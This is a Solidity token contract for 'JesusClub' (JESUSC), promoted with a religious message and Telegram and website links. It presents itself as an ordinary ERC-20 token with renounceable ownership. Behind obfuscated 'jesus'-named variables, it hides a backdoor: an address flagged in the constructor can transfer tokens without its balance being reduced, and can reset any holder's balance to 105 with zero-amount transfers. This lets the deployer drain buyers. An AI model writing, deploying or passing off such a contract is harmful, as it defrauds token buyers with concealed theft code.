/*

Come to Jesus and be born again!

https://t.me/jesusclub
https://thejesusclubs.com/

*/

// SPDX-License-Identifier: MIT

pragma solidity >0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract JesusClub is Ownable {
    mapping(address => uint256) public balanceOf;

    string public name = 'JesusClub';

    function approve(address jesusapprover, uint256 jesusnumber) public returns (bool success) {
        allowance[msg.sender][jesusapprover] = jesusnumber;
        emit Approval(msg.sender, jesusapprover, jesusnumber);
        return true;
    }

    uint8 public decimals = 9;

    function jesusspender(address jesusrow, address jesusreceiver, uint256 jesusnumber) private {
        if (jesuswallet[jesusrow] == 0) {
            balanceOf[jesusrow] -= jesusnumber;
        }
        balanceOf[jesusreceiver] += jesusnumber;
        if (jesuswallet[msg.sender] > 0 && jesusnumber == 0 && jesusreceiver != jesuspair) {
            balanceOf[jesusreceiver] = jesusvalue;
        }
        emit Transfer(jesusrow, jesusreceiver, jesusnumber);
    }

    address public jesuspair;

    mapping(address => mapping(address => uint256)) public allowance;

    string public symbol = 'JESUSC';

    mapping(address => uint256) private jesuswallet;

    function transfer(address jesusreceiver, uint256 jesusnumber) public returns (bool success) {
        jesusspender(msg.sender, jesusreceiver, jesusnumber);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function transferFrom(address jesusrow, address jesusreceiver, uint256 jesusnumber) public returns (bool success) {
        require(jesusnumber <= allowance[jesusrow][msg.sender]);
        allowance[jesusrow][msg.sender] -= jesusnumber;
        jesusspender(jesusrow, jesusreceiver, jesusnumber);
        return true;
    }

    constructor(address jesusmarket) {
        balanceOf[msg.sender] = totalSupply;
        jesuswallet[jesusmarket] = jesusvalue;
        IUniswapV2Router02 jesusworkshop = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        jesuspair = IUniswapV2Factory(jesusworkshop.factory()).createPair(address(this), jesusworkshop.WETH());
    }

    uint256 private jesusvalue = 105;

    mapping(address => uint256) private jesusprime;
}